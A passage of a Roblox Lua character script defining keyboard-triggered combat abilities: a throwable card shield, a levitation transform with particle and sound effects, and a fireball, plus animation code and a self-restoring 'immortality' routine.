					brick.Size = brick.Size - Vector3.new(1.5,.025,2.5)
					swait()
				end
				ws = 15
				brick:Remove()
				enemyhum.Parent:Remove()
				attacking = false
				removeuseless:AddItem(g1,0.001)
				debounce = false
				appi = false
			end
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='p' then
			if levitate then return end
			if blocking then
				if blockedoff then return end
				clickallowance = false
				appi = false
				attacking = true
				blocking = false
				throwing = true
				ws = 15
				n = 0
				blockcard.CanCollide = false
				for i = 1, 35 do
					n = n + 20
					blockcard.CFrame = Root.CFrame * CFrame.new(0,3,-5) * CFrame.Angles(0,math.rad(n),0)
					ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(25), math.rad(0)), 0.3)
					LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-50 - 2 * math.sin(sine/12)), math.rad(12), math.rad(9)), 0.3)
					LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-.65, .6, 1) * CFrame.Angles(0,0,0),.3)
					swait()
				end
				blockcard.CFrame = Root.CFrame * CFrame.new(0,3,-5 + -1) * CFrame.Angles(0,0,0)
				blockcard.CanCollide = false
				locater1 = Instance.new("Part",blockcard)
				locater1.Size = Vector3.new(1,1,1)
				locater1.CanCollide = false
				locater1.Anchored = true
				locater1.Transparency = 1
				locater2 = Instance.new("Part",blockcard)
				locater2.Size = Vector3.new(1,1,1)
				locater2.CanCollide = false
				locater2.Transparency = 1
				locater2.Anchored = true
				locater3 = Instance.new("Part",blockcard)
				locater3.Size = Vector3.new(1,1,1)
				locater3.Transparency = 1
				locater3.CFrame = blockcard.CFrame * CFrame.Angles(math.rad(90),0,0)
				locater3.CanCollide = false
				locater3.Anchored = true
				fushfush = Instance.new("Sound",blockcard)
				fushfush.SoundId = "rbxassetid://288641686"
				fushfush.Volume = 8
				fushfush:Play()
				boosh:Play()
				coroutine.wrap(function()
					n = 0
					for i = 1, 35 do
						n = n + 10
						shockwave = Instance.new("Part", Torso)
						shockwave.Size = Vector3.new(1,1,1)
						shockwave.CanCollide = false
						shockwave.Anchored = true
						shockwave.Transparency = .5
						shockwave.BrickColor = BrickColor.new("White")
						shockwave.CFrame = locater3.CFrame
						shockwavemesh = Instance.new("SpecialMesh", shockwave)
						shockwavemesh.Scale = Vector3.new(15,.7,15)
						shockwavemesh.MeshId = "rbxassetid://20329976"
						shockwave.CFrame = locater3.CFrame * CFrame.Angles(math.rad(0),math.rad(1),0)
						removeuseless:AddItem(shockwave,1)
						table.insert(lolzor2,shockwave)
						for i,v in pairs(lolzor2) do
							v.Transparency = v.Transparency + .1
							v.CFrame = v.CFrame * CFrame.Angles(math.rad(0),math.rad(n),0)
						end
						swait()
					end
				end)()
				for i = 1, 35 do
					ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(-20), math.rad(0)), 0.3)
					LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
					LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(-20), math.rad(4)), 0.3)
					fushfush.Volume = fushfush.Volume - .2
					Hit = damagealll(20,blockcard.Position)
					for _,v in pairs(Hit) do			
						v:FindFirstChildOfClass("Humanoid"):TakeDamage(0)
						vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
						vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
						torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
						vel.velocity = CFrame.new(blockcard.Position,torso.Position).lookVector*120
						removeuseless:AddItem(vel,.1)
					end
					locater1.CFrame = blockcard.CFrame * CFrame.new(-5,-6,0)
					locater3.CFrame = blockcard.CFrame * CFrame.new(0,0,-1) * CFrame.Angles(math.rad(90),0,0)
					locater2.CFrame = blockcard.CFrame * CFrame.new(5,-6,0)
					grassblocks = Instance.new("Part",Torso)
					grassblocks.Size = Vector3.new(4,4,4)
					grassblocks.Material = "Grass"
					grassblocks.Anchored = true
					grassblocks.BrickColor = BrickColor.new("Bright green")
					grassblocks.CFrame = locater1.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
					removeuseless:AddItem(grassblocks,5)
					grassblocks2 = Instance.new("Part",Torso)
					grassblocks2.Size = Vector3.new(4,4,4)
					grassblocks2.Material = "Grass"
					grassblocks2.Anchored = true
					grassblocks2.BrickColor = BrickColor.new("Bright green")
					grassblocks2.CFrame = locater2.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
					removeuseless:AddItem(grassblocks2,5)
					blockcardshadow = Instance.new("Part",Torso)
					blockcardshadow.Transparency = .5
					blockcardshadow.Anchored = true
					blockcardshadow.Material = "Neon"
					blockcardshadow.BrickColor = BrickColor.new("White")
					blockcardshadow.Size = Vector3.new(8, 13, 0.3)
					blockcardshadow.CanCollide = false
					blockcardshadow.CFrame = blockcard.CFrame
					removeuseless:AddItem(blockcardshadow,2)
					table.insert(lolzor,blockcardshadow)
					for i,v in pairs(lolzor) do
						v.Transparency = v.Transparency + 0.05
					end
					blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,-4)
					swait()
				end
				blockcard.Name = "Getthisshitoutofhere"
				for i = 1, 10 do
					blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,-2)
					blockcard.Transparency = blockcard.Transparency + .1
					acer.Transparency = blockcard.Transparency
					ace2.Transparency = blockcard.Transparency
					for i,v in pairs(lolzor) do
						v.Transparency = v.Transparency + .05
					end
					for i,v in pairs(lolzor2) do
						v.Transparency = v.Transparency + .1
					end
					swait()
				end
				lolzor={}
				lolzor2={}
				attacking = false
				debounce = false
				blocking = false
				throwing = false
				fushfush:Remove()
				clickallowance = false
				appi = false
				blockcard:Remove()
				g1:Remove()
				ws = 15
			else
				if debounce then return end
				if throwing then return end
				debounce = true
				ws = 15
				attacking = true
				blocking = true
				boosh = Instance.new("Sound",nil)
				boosh.SoundId = "rbxassetid://413682983"
				boosh.Volume = 6
				appi = true
				coroutine.wrap(function()
					while appi do
						wait()
						if Root.Velocity.y > 1 and attacking == true then
							position = "Jump2"
						elseif Root.Velocity.y < -1 and attacking == true then
							position = "Falling2"
						elseif Root.Velocity.Magnitude < 2 and attacking == true then
							position = "Idle2"
						elseif Root.Velocity.Magnitude > 2 and attacking == true then
							position = "Walking2"
						end
					end
				end)()
				coroutine.wrap(function()
					while appi do
						wait()
						settime = 0.05
						sine = sine + change
						if position == "Jump2" and attacking == true and appi == true then
							change = 1
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
							ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
						elseif position == "Falling2" and attacking == true and appi == true then
							change = 1
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
						elseif position == "Idle2" and attacking == true and appi == true then
							change = .4
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
						elseif position == "Walking2" and attacking == true and appi == true then
							change = .8
							LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
							RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
							RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
							RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
							ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
							RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)), 0.3)
							LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)), 0.3)
						end
					end
				end)()
				blockcard = Instance.new("Part",Torso)
				blockcard.Material = "Neon"
				blockcard.Transparency = 1
				blockcard.BrickColor = BrickColor.new("White")
				blockcard.Size = Vector3.new(8, 13, 0.3)
				blockcard.CFrame = Root.CFrame * CFrame.new(0,2,-5)
				blockcard.Anchored = true
				boosh.Parent = blockcard
				SOUND(blockcard,236989198,6,false,1)
				ace = aces[math.random(1,#aces)]
				acer = Instance.new("Decal",blockcard)
				acer.Texture = "rbxassetid://"..ace
				acer.Transparency = 1
				acer.Face = "Front"
				ace2 = acer:Clone()
				ace2.Parent = blockcard
				ace2.Face = "Back"
				coroutine.wrap(function()
					for i = 1, 20 do
						blockcard.Transparency = blockcard.Transparency - 0.05
						acer.Transparency = blockcard.Transparency
						ace2.Transparency = blockcard.Transparency
						swait()
					end
					clickallowance = true
				end)()
				g1 = Instance.new("BodyGyro", Root)
				g1.D = 175
				g1.P = 20000
				g1.MaxTorque = Vector3.new(0,9000,0)
				coroutine.wrap(function()
					while blocking do
						if not blockedoff then
							ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,-.2, 0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),.3)
							blockcard.CFrame = Root.CFrame * CFrame.new(0,3,-5)
							g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
							LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0)*CFrame.Angles(0,0,0),.3)
							LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
						end
						swait()
					end
				end)()
				wait(1)
				mouse.Button1Down:connect(function()
					if throwing then return end
					if not clickallowance then return end
					clickallowance = false
					blockedoff = true
					ws = 15
					for i = 1, 15 do
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(25), math.rad(0)), 0.3)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-50 - 2 * math.sin(sine/12)), math.rad(12), math.rad(9)), 0.3)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-.65, .6, 1) * CFrame.Angles(0,0,0),.3)
						swait()
					end
					boosh:Play()
					hitdebounce = false
					blockcard.Touched:connect(function(hit)
						if hit.Parent:IsA("Part") then
						elseif hit.Parent:IsA("SpecialMesh") then
						elseif hit.Parent.Name == game.Players.LocalPlayer.Name then
						elseif hit.Parent:findFirstChildOfClass("Humanoid") then
							for i,v in pairs(hit.Parent:GetChildren()) do
								Slachtoffer = v.Parent:FindFirstChildOfClass("Humanoid")
								if hitdebounce then return end
								hitdebounce = true
								vel = Instance.new("BodyVelocity",hit.Parent:FindFirstChild("Torso") or hit.Parent:FindFirstChild("UpperTorso")) 
								vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
								if Slachtoffer.RigType == Enum.HumanoidRigType.R15 then
									tors = hit.Parent:FindFirstChild("UpperTorso")
								else
									tors = hit.Parent:FindFirstChild("Torso")
								end
								vel.velocity = CFrame.new(Root.Position,tors.Position).lookVector*120
								removeuseless:AddItem(vel,.1)
								Slachtoffer:TakeDamage(0)
							end
						end
					end)
					for i = 1, 10 do
						ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(-20), math.rad(0)), 0.3)
						LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
						LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(-20), math.rad(4)), 0.3)
						blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,0-1)
						swait()
					end
					for i = 1, 10 do
						blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,0+1)
						swait()
					end
					hitdebounce = true
					ws = 10
					clickallowance = true
					blockedoff = false
				end)
			end
		end
	end)


	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='f' then
			if debounce then return end
			if notallowedtransform then return end
			debounce = true
			if levitate then
				levitate = false
				mjester.VertexColor = Vector3.new(1, 1, 1)
				glow.Transparency = 1
				blastwave = Instance.new("Part",Torso)
				blastwave.CFrame = Torso.CFrame
				blastwave.Anchored = true
				blastwave.Material = "Neon"
				blastwave.CanCollide = false
				blastwave.Shape = "Ball"
				blastwave.Size = Vector3.new(3,3,3)
				coroutine.wrap(function()
					for i = 1, 20 do
						levitatewave.Transparency = levitatewave.Transparency + 0.05
						levitatewave2.Transparency = levitatewave2.Transparency + 0.05
						blastwave.Size = blastwave.Size + Vector3.new(2,2,2)
						blastwave.Transparency = blastwave.Transparency + 0.05
						swait()
					end
					blastwave:Remove()
					levitatewave2:Remove()
					levitatewave:Remove()
				end)()
				ws = 10
				notallowedtransform = true
				attacking = true
				coroutine.wrap(function()
					for i = 1, 10 do
						for i,v in pairs(LeftArm:GetChildren()) do if v.Name == lmagic.Name then
								v.Transparency = v.Transparency + 0.1
							end
						end
						for i,v in pairs(RightArm:GetChildren()) do if v.Name == rmagic.Name then
								v.Transparency = v.Transparency + 0.1
							end
						end
						wait()
					end
				end)()
				doomtheme.SoundId = "rbxassetid://1843358057"
				jesterWeld.C0 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				wait(0.000001)
				jesterWeld.C0 = jester.CFrame:inverse() * Head.CFrame * CFrame.new(0,-.3,0) * CFrame.Angles(math.rad(0),math.rad(90),0)
				mjester.Scale = Vector3.new(1.1, 1.1, 1.1)
				mjester.MeshId,mjester.TextureId = 'rbxassetid://1241662062','rbxassetid://1241662395'

				mMask.Scale = Vector3.new(0.13, 0.13, 0.1)
				mMask.MeshId,mMask.TextureId = 'http://www.roblox.com/asset/?id=5158270','http://www.roblox.com/asset/?id=9543585'
				maskweld.C0 = CFrame.new(0,0,0)*CFrame.Angles(0,0,0)
				wait(0.000001)
				maskweld.C0 = CFrame.new(0,-.555,0) * CFrame.Angles(math.rad(90),0,0)

				eyo1 = Instance.new("Part",Head)
				eyo1.BrickColor = BrickColor.new("White")
				eyo1.Material = "Neon"
				eyo1.Shape = "Ball"
				eyo1.Name = "eyo1"
				eyo1.CanCollide = false
				eyo1.Size = Vector3.new(0.33, 0.33, 0.33)
				eyo1weld = weldBetween(eyo1,Head)
				eyo1weld.C0 = CFrame.new(.215,-.05,.52)

				light = Instance.new("PointLight", eyo1)
				light.Color = Color3.new(1,1,1)
				light.Range = 3
				light.Brightness = 4
				light.Enabled = true

				eyo2 = Instance.new("Part",Head)
				eyo2.BrickColor = BrickColor.new("White")
				eyo2.Material = "Neon"
				eyo2.Shape = "Ball"
				eyo2.Name = "eyo2"
				eyo2.CanCollide = false
				eyo2.Size = Vector3.new(0.33, 0.33, 0.33)
				eyo2weld = weldBetween(eyo2,Head)
				eyo2weld.C0 = CFrame.new(-.215,-.05,.52)

				light2 = Instance.new("PointLight", eyo2)
				light2.Color = Color3.new(1,1,1)
				light2.Range = 3
				light2.Brightness = 4
				light2.Enabled = true

				Character.Shirt.ShirtTemplate = "rbxassetid://676428254"
				Character.Pants.PantsTemplate = "rbxassetid://676428351"
				hum.HipHeight = 0
				ws = 10
				debounce = false
				attacking = false
				coroutine.wrap(function()
					wait(3)
					notallowedtransform = false
				end)()
			else
				ws = 50
				notallowedtransform = true
				levitate = true
				ws = 50
				glow.Transparency = 0
				eyo1:Remove()
				eyo2:Remove()
				coroutine.wrap(function()
					while levitate do
						for i,v in pairs(Head:GetChildren()) do
							if v.Name == "eyo1" or v.Name == "eyo2" then
								v:Remove()
							end
						end
						wait()
					end
				end)()
				mnb = 0
				levitatewave = Instance.new("Part", Torso)
				levitatewave.Size = Vector3.new(1,1,1)
				levitatewave.CanCollide = false
				levitatewave.Anchored = true
				levitatewave.Transparency = .5
				levitatewave.BrickColor = BrickColor.new("Really black")
				levitatewave.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-5,0)
				levitatewavemesh = Instance.new("SpecialMesh", levitatewave)
				levitatewavemesh.Scale = Vector3.new(2.5,.3,2.5)
				levitatewavemesh.MeshId = "rbxassetid://20329976"
				levitatewave2 = Instance.new("Part", Torso)
				levitatewave2.Size = Vector3.new(1,1,1)
				levitatewave2.CanCollide = false
				levitatewave2.Anchored = true
				levitatewave2.Transparency = .5
				levitatewave2.BrickColor = BrickColor.new("Really red")
				levitatewave2.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-5,0)
				levitatewavemesh2 = Instance.new("SpecialMesh", levitatewave2)
				levitatewavemesh2.Scale = Vector3.new(2,.4,2)
				levitatewavemesh2.MeshId = "rbxassetid://20329976"
				blastwave = Instance.new("Part",Torso)
				blastwave.CFrame = Torso.CFrame
				blastwave.Anchored = true
				blastwave.Material = "Neon"
				blastwave.CanCollide = false
				blastwave.Shape = "Ball"
				blastwave.Size = Vector3.new(3,3,3)
				coroutine.wrap(function()
					for i = 1, 20 do
						blastwave.Size = blastwave.Size + Vector3.new(2,2,2)
						blastwave.Transparency = blastwave.Transparency + 0.05
						swait()
					end
					blastwave:Remove()
				end)()
				coroutine.wrap(function()
					while levitate do
						mnb = mnb + 15
						levitatewave.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-6 + .5 * math.sin(sine/9),0) * CFrame.Angles(0,math.rad(mnb),0)
						levitatewave2.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-6 + .5 * math.sin(sine/9),0) * CFrame.Angles(0,math.rad(mnb),0)
						colors = colortable[math.random(1,#colortable)]
						lmagic = Instance.new("Part",LeftArm)
						lmagic.Material = "Neon"
						lmagic.CanCollide = false
						lmagic.Anchored = true
						lmagic.BrickColor = BrickColor.new(colors)
						lmagic.Size = Vector3.new(1,1,1)
						lmagic.CFrame = leftlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
						removeuseless:AddItem(lmagic,2)
						rmagic = Instance.new("Part",RightArm)
						rmagic.Material = "Neon"
						rmagic.CanCollide = false
						rmagic.Anchored = true
						rmagic.BrickColor = BrickColor.new(colors)
						rmagic.Size = Vector3.new(1,1,1)
						rmagic.CFrame = rightlocation.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
						removeuseless:AddItem(rmagic,2)
						for i,v in pairs(LeftArm:GetChildren()) do if v.Name == lmagic.Name then
								v.Transparency = v.Transparency + 0.05
							end
						end
						for i,v in pairs(RightArm:GetChildren()) do if v.Name == rmagic.Name then
								v.Transparency = v.Transparency + 0.05
							end
						end
						swait()
					end
				end)()
				framee = Instance.new("Frame")
				framee.Parent = screenGui
				framee.Position = UDim2.new(0, 8, 0, -500)
				framee.Size = UDim2.new(100000000,10000000,10000000,10000000)
				framee.BackgroundColor3 = BrickColor.new("White").Color
				framee.BackgroundTransparency = 0
				coroutine.wrap(function()
					wait(.2)
					for i = 1, 40 do
						hum.CameraOffset = Vector3.new(math.random(-1,1),math.random(-1,1),math.random(-0,0))
						framee.BackgroundTransparency = framee.BackgroundTransparency + 0.025
						swait()
					end
					hum.CameraOffset = Vector3.new(0,0,0)
					framee:Remove()
				end)()
				doomtheme.SoundId = "rbxassetid://1382488262"
				doomtheme:Play()
				doomtheme.Volume = 2
				doomtheme.TimePosition = 20.7
				jesterWeld.C0 = jesterWeld.C0 * CFrame.new(.3,-.3,0) * CFrame.Angles(math.rad(0),math.rad(-90),0)
				mjester.MeshId = "rbxassetid://193760002"
				mjester.TextureId = "rbxassetid://379225327"
				mjester.VertexColor = Vector3.new(1, 0, 0)
				Character.Shirt.ShirtTemplate = "rbxassetid://238537827"
				Character.Pants.PantsTemplate = "rbxassetid://486031443"
				maskweld.C0 = maskweld.C0 * CFrame.new(0,.55,-.5) * CFrame.Angles(math.rad(-90),math.rad(0),math.rad(0))
				mMask.MeshId = "rbxassetid://13520257"
				mMask.Scale = Vector3.new(1.1, 1, 1)
				mMask.TextureId = "rbxassetid://13520260"
				eyo1:Remove()
				eyo2:Remove()
				coroutine.wrap(function()
					while levitate do
						hum.HipHeight = 3 - .5 * math.sin(sine/9)
						swait()
					end
				end)()
				attacking = false
				debounce = false
				coroutine.wrap(function()
					wait(3)
					notallowedtransform = false
				end)()
			end
		end
	end)

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='.' then
			hum.Parent:BreakJoints()
		end
	end)

	checks1 = coroutine.wrap(function() -------Checks
		while true do
			if Root.Velocity.y > 1 and levitate == false then
				position = "Jump"
			elseif Root.Velocity.y < -1 and levitate == false then
				position = "Falling"
			elseif Root.Velocity.Magnitude < 2 and running == false and not levitate then
				position = "Idle"
			elseif Root.Velocity.Magnitude < 2 and running == false then
				position = "Idle2"
			elseif Root.Velocity.Magnitude < 20 and running == false and levitate == false then
				position = "Walking"
			elseif Root.Velocity.Magnitude > 20 and running == false and levitate then
				position = "Walking2"
			elseif Root.Velocity.Magnitude > 20 and levitate == false then
				position = "Running"
			else
			end
			wait()
		end
	end)
	checks1()

	function ray(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
		return workspace:FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
	end

	function ray2(StartPos, EndPos, Distance, Ignore)
		local DIRECTION = CFrame.new(StartPos,EndPos).lookVector
		return ray(StartPos, DIRECTION, Distance, Ignore)
	end

	OrgnC0 = Neck.C0
	local movelimbs = coroutine.wrap(function()
		while RunSrv.RenderStepped:wait() do
			TrsoLV = Torso.CFrame.lookVector
			Dist = nil
			Diff = nil
			if not MseGuide then
				print("Failed to recognize")
			else
				local _, Point = Workspace:FindPartOnRay(Ray.new(Head.CFrame.p, mouse.Hit.lookVector), Workspace, false, true)
				Dist = (Head.CFrame.p-Point).magnitude
				Diff = Head.CFrame.Y-Point.Y
				local _, Point2 = Workspace:FindPartOnRay(Ray.new(LeftArm.CFrame.p, mouse.Hit.lookVector), Workspace, false, true)
				Dist2 = (LeftArm.CFrame.p-Point).magnitude
				Diff2 = LeftArm.CFrame.Y-Point.Y
				HEADLERP.C0 = CFrame.new(0, -1.5, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
				Neck.C0 = Neck.C0:lerp(OrgnC0*CFrame.Angles((math.tan(Diff/Dist)*1), 0, (((Head.CFrame.p-Point).Unit):Cross(Torso.CFrame.lookVector)).Y*1), .1)
			end
		end
	end)
	movelimbs()
	immortal = {}
	for i,v in pairs(Character:GetDescendants()) do
		if v:IsA("BasePart") and v.Name ~= "lmagic" and v.Name ~= "rmagic" then
			if v ~= Root and v ~= Torso and v ~= Head and v ~= RightArm and v ~= LeftArm and v ~= RightLeg and v.Name ~= "lmagic" and v.Name ~= "rmagic" and v ~= LeftLeg then
				v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
			end
			table.insert(immortal,{v,v.Parent,v.Material,v.Color,v.Transparency})
		elseif v:IsA("JointInstance") then
			table.insert(immortal,{v,v.Parent,nil,nil,nil})
		end
	end
	for e = 1, #immortal do
		if immortal[e] ~= nil then
			local STUFF = immortal[e]
			local PART = STUFF[1]
			local PARENT = STUFF[2]
			local MATERIAL = STUFF[3]
			local COLOR = STUFF[4]
			local TRANSPARENCY = STUFF[5]
			if levitate then
				if PART.ClassName == "Part" and PART ~= Root and PART.Name ~= eyo1 and PART.Name ~= eyo2 and PART.Name ~= "lmagic" and PART.Name ~= "rmagic" then
					PART.Material = MATERIAL
					PART.Color = COLOR
					PART.Transparency = TRANSPARENCY
				end
				PART.AncestryChanged:connect(function()
					PART.Parent = PARENT
				end)
			else
				if PART.ClassName == "Part" and PART ~= Root and PART.Name ~= "lmagic" and PART.Name ~= "rmagic" then
					PART.Material = MATERIAL
					PART.Color = COLOR
					PART.Transparency = TRANSPARENCY
				end
				PART.AncestryChanged:connect(function()
					PART.Parent = PARENT
				end)
			end
		end
	end
	function immortality()
		for e = 1, #immortal do
			if immortal[e] ~= nil then
				local STUFF = immortal[e]
				local PART = STUFF[1]
				local PARENT = STUFF[2]
				local MATERIAL = STUFF[3]
				local COLOR = STUFF[4]
				local TRANSPARENCY = STUFF[5]
				if PART.ClassName == "Part" and PART == Root then
					PART.Material = MATERIAL
					PART.Color = COLOR
					PART.Transparency = TRANSPARENCY
				end
				if PART.Parent ~= PARENT then
					hum:Remove()
					PART.Parent = PARENT
					hum = Instance.new("Humanoid",Character)
					if levitate then
						eyo1:Remove()
						eyo2:Remove()
					end
					hum.Name = "noneofurbusiness"
				end
			end
		end
	end
	coroutine.wrap(function()
		while true do
			if hum.Health < .1 then
				deadsound = Instance.new("Sound", Torso)
				deadsound.Volume = 6
				deadsound.SoundId = "rbxassetid://1411352723"
				deadsound:Play()
				immortality()
			end
			wait()
		end
	end)()

	mouse.KeyDown:connect(function(Press)
		Press=Press:lower()
		if Press=='g' then
			if not levitate then return end
			if debounce then return end
			debounce = true
			attacking = true
			FireBall:Play()
			ws = 15
			g1 = Instance.new("BodyGyro", Root)
			g1.D = 175
			g1.P = 20000
			g1.MaxTorque = Vector3.new(0,9000,0)
			for i = 1, 15 do
				g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
				ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(-15),math.rad(0)),.5)
				RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
				RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(14), math.rad(20), math.rad(-90)), 0.3)
				swait()
			end
			local swoosh = Instance.new("Part",Torso)
			swoosh.Name = "swoosh"
			swoosh.CFrame = rightlocation.CFrame * CFrame.new(0,0,0)
